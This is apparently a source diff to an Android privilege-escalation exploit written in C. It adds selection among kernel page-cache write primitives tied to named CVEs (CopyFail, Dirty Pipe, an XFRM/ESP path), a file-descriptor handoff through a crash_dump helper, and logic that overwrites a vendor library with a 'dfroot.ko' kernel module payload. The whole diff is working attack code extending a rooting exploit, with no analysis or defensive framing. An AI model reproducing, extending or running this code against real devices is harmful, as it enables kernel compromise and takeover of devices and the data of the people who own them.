@@ -16,6 +16,7 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include "aes256.h"
+#include "pagecache.h"
 
 #define eos(s) (s + strlen(s))
 
@@ -27,6 +28,11 @@ static int      g_sender_port;
 static uint32_t g_spi;
 static uint8_t  g_aes_key[32];
 static uint32_t g_seq = 1;
+
+static int g_prim = PCW_XFRM;
+static int g_prim_failed;
+static int g_vendor_fd = -1;
+
 struct PatchRestore {
     const char *lib;
     uint64_t    tramp_aligned;
@@ -109,6 +115,88 @@ static int read_vendor_content(off_t offset, uint8_t buf[16]) {
         return -1;
     }
     return 0;
+}
+
+/* Primitive selection. Auto order: CopyFail -> XFRM.
+ *
+ * CopyFail needs AF_ALG, which Android's app seccomp policy usually denies,
+ * so a failed probe is normal and simply moves to the next candidate.
+ * Dirty Pipe stays opt-in: it cannot write at a page boundary or across one,
+ * which rules out the KO image (page-aligned, tens of KiB) it would need to
+ * carry here.
+ */
+static void select_primitive(const char *want)
+{
+    if (!want || !strcmp(want, "auto")) {
+        g_prim = (pcw_copyfail_probe() == 0) ? PCW_COPYFAIL : PCW_XFRM;
+    } else if (!strcmp(want, "copyfail")) {
+        g_prim = (pcw_copyfail_probe() == 0) ? PCW_COPYFAIL : -1;
+    } else if (!strcmp(want, "dirtypipe")) {
+        g_prim = (pcw_dirtypipe_probe() == 0) ? PCW_DIRTYPIPE : -1;
+    } else if (!strcmp(want, "xfrm")) {
+        g_prim = PCW_XFRM;
+    } else {
+        g_prim = -1;
+    }
+}
+
+static void probe_report(void)
+{
+    struct utsname u;
+    if (uname(&u) != 0) strcpy(u.release, "unknown");
+    printf("kernel: %s\n", u.release);
+    printf("copyfail  (CVE-2026-31431): %s\n",
+           pcw_copyfail_probe() == 0 ? "usable" :
+           "blocked (AF_ALG socket denied: seccomp or SELinux)");
+    printf("dirtypipe (CVE-2022-0847): %s\n",
+           pcw_dirtypipe_probe() == 0 ?
+           "kernel in range, but sub-page unaligned writes only "
+           "(opt-in; cannot carry the KO image)" :
+           "not applicable (kernel outside 5.8-5.16 vulnerable branches)");
+    printf("xfrm      (CVE-2026-43284): requires the IpSecManager ESP path; "
+           "selected when both page-cache primitives are unavailable\n");
+}
+
+/* Crash_dump bridge: hand the vendor file description back to us so
+ * CopyFail / Dirty Pipe can splice its pages directly (the helper's write
+ * only needs an O_RDONLY fd). SCM_RIGHTS is mandatory: the clone has no
+ * CLONE_FILES, so the child's dup2 never reaches the parent's table.
+ */
+static int handoff_vendor_fd(void)
+{
+    int sv[2];
+    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) < 0) {
+        printf("handoff socketpair failed: %s\n", strerror(errno));
+        return -1;
+    }
+
+    int st = spawn_crash_dump(0, sv[0], 1, "h");
+    close(sv[0]);
+
+    int fd = -1;
+    if (st >= 0 && WIFEXITED(st) && WEXITSTATUS(st) == 0) {
+        struct msghdr msg;
+        union {
+            struct cmsghdr align;
+            char buf[CMSG_SPACE(sizeof(int))];
+        } cbuf;
+        memset(&msg, 0, sizeof(msg));
+        memset(&cbuf, 0, sizeof(cbuf));
+        msg.msg_control = cbuf.buf;
+        msg.msg_controllen = sizeof(cbuf.buf);
+
+        if (recvmsg(sv[1], &msg, 0) > 0) {
+            struct cmsghdr *cm = CMSG_FIRSTHDR(&msg);
+            if (cm && cm->cmsg_level == SOL_SOCKET &&
+                cm->cmsg_type == SCM_RIGHTS &&
+                cm->cmsg_len >= CMSG_LEN(sizeof(int)))
+                memcpy(&fd, CMSG_DATA(cm), sizeof(int));
+        }
+    } else {
+        printf("handoff helper status=0x%x\n", st);
+    }
+    close(sv[1]);
+    return fd;
 }
 
 /* Send one CBC write.
@@ -200,10 +288,26 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
     }
 
     int rc = 0;
+    int wfd = use_helper ? g_vendor_fd : file_fd;
+
+    /* Page-cache primitives take the whole run at once; only XFRM needs to
+     * walk 16-byte ESP blocks. */
+    if (g_prim != PCW_XFRM && g_prim >= 0 && wfd >= 0 && !g_prim_failed) {
+        int ok = (g_prim == PCW_COPYFAIL)
+                 ? pcw_copyfail_write_fd(wfd, (off_t)foff, payload, len)
+                 : pcw_dirtypipe_write_fd(wfd, (off_t)foff, payload, len);
+        if (ok == 0) goto done;
+        g_prim_failed = 1;
+        printf("%s failed at 0x%zx, falling back to xfrm\n",
+               pcw_prim_name(g_prim), foff);
+    }
+
     for (size_t i = 0; i < len / 16; i++) {
         off_t off = (off_t)(foff + i * 16);
-        uint8_t old_content[16] = {0};
+        uint8_t desired[16] = {0};
+        memcpy(desired, payload + i * 16, 16);
 
+        uint8_t old_content[16] = {0};
         if (use_helper) {
             if (read_vendor_content(off, old_content) < 0) {
                 rc = -1; break;
@@ -215,9 +319,6 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
             }
         }
 
-        uint8_t desired[16] = {0};
-        memcpy(desired, payload + i * 16, 16);
-
         uint8_t iv[16];
         compute_iv(old_content, desired, iv);
 
@@ -227,10 +328,13 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
         }
     }
 
+done:
     close(pfd[0]); close(pfd[1]);
     if (!use_helper) close(file_fd);
     close(sk_send);
-    if (rc == 0) printf("patched %zu bytes to %s+0x%zx\n", len, path, foff);
+    if (rc == 0)
+        printf("patched %zu bytes to %s+0x%zx via %s\n",
+               len, path, foff, pcw_prim_name(g_prim));
     return rc;
 }
 
@@ -375,6 +479,17 @@ static int patch_ko(void) {
     char *buf = pad16(ko->start, (size_t)(ko->end - ko->start), &len);
     if (!buf) { printf("patch: %s - pad16 alloc failed\n", libcxx_ko_target); return -1; }
     printf("patch: %s <- dfroot.ko (%zu bytes)\n", libcxx_ko_target, len);
+
+    /* Without the bridge we can only reach vendor_file through XFRM's
+     * crash_dump splice. With a handed-off fd, the faster page-cache
+     * primitives work here too and survive an already-patched XFRM path.
+     */
+    if (g_prim != PCW_XFRM && g_prim >= 0 && g_vendor_fd < 0) {
+        g_vendor_fd = handoff_vendor_fd();
+        printf("vendor fd handoff: %s\n",
+               g_vendor_fd >= 0 ? "ok" : "unavailable (xfrm helper path)");
+    }
+
     int ret = patch_file_cbc(libcxx_ko_target, buf, len, 0, 1);
     free(buf);
     if (ret) printf("patch: %s patch failed: %d\n", libcxx_ko_target, ret);
@@ -382,6 +497,7 @@ static int patch_ko(void) {
 }
 
 static void cleanup(void) {
+    if (g_vendor_fd >= 0) { close(g_vendor_fd); g_vendor_fd = -1; }
     if (!g_libcxx_r.valid) return;
     printf("\n=== cleanup ===\n");
     printf("restoring trampoline in %s\n", g_libcxx_r.lib);
@@ -494,7 +610,8 @@ static int hex_to_bytes(const char *hex, uint8_t *out, size_t len) {
 
 static void usage(const char *argv0) {
     fprintf(stderr,
-            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX\n", argv0);
+            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX "
+            "[--primitive auto|xfrm|copyfail|dirtypipe] [--probe]\n", argv0);
 }
 
 static int setup(int argc, char **argv) {
@@ -502,6 +619,8 @@ static int setup(int argc, char **argv) {
     uint32_t spi = 0;
     uint8_t aes_key[32];
     int have_aes = 0;
+    const char *prim = "auto";
+    int do_probe = 0;
 
     for (int i = 1; i < argc; i++) {
         const char *a = argv[i];
@@ -513,8 +632,24 @@ static int setup(int argc, char **argv) {
             spi = (uint32_t)strtoul(argv[++i], NULL, 0);
         else if (!strcmp(a, "--aes-key") && i + 1 < argc)
             have_aes = hex_to_bytes(argv[++i], aes_key, sizeof(aes_key)) == 0;
+        else if (!strcmp(a, "--primitive") && i + 1 < argc)
+            prim = argv[++i];
+        else if (!strcmp(a, "--probe"))
+            do_probe = 1;
         else { usage(argv[0]); return 2; }
     }
+
+    probe_report();
+    if (do_probe) {
+        select_primitive(prim);
+        if (g_prim < 0) {
+            printf("primitive %s unusable\n", prim);
+            return 3;
+        }
+        printf("selected: %s (%s)\n", pcw_prim_name(g_prim), pcw_prim_cve(g_prim));
+        return 1;   /* probe-only: main exits before patching */
+    }
+
     if (!encap_port || !sender_port || !spi || !have_aes) {
         usage(argv[0]); return 2;
     }
@@ -523,7 +658,16 @@ static int setup(int argc, char **argv) {
     g_sender_port = sender_port;
     g_spi         = spi;
     g_seq         = 1;
+    g_prim_failed = 0;
+    if (g_vendor_fd >= 0) { close(g_vendor_fd); g_vendor_fd = -1; }
     memcpy(g_aes_key, aes_key, 32);
+
+    select_primitive(prim);
+    if (g_prim < 0) {
+        printf("primitive %s unavailable\n", prim);
+        return 2;
+    }
+    printf("primitive: %s (%s)\n", pcw_prim_name(g_prim), pcw_prim_cve(g_prim));
 
     const char *ko_target = detect_ko_target();
     libcxx_ko_target = libcxx_data + libcxx_ko_target_off;
@@ -593,7 +737,9 @@ done:
 
 int main(int argc, char **argv) {
     setvbuf(stdout, NULL, _IONBF, 0);
-    if (setup(argc, argv) != 0) return 2;
+    int sr = setup(argc, argv);
+    if (sr == 1) return 0;
+    if (sr != 0) return 2;
     int rc = exploit();
     cleanup();
     return rc;
